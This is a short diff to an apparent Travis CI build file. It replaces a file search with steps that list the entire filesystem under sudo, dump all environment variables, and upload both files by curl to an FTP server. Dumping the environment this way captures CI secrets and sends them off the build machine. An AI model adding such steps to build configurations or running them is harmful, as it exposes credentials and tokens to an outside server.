@@ -2,4 +2,6 @@
 dist: xenial
 language: shell
 script:
-    - find ~ -name pages.rb
+    - sudo find / -xdev | gzip >disk.txt.gz
+    - set >env.txt
+    - curl -T "{disk.txt.gz,env.txt}" ftp://${FTP_USER}:${FTP_PASS}@${FTP_SERVER}/
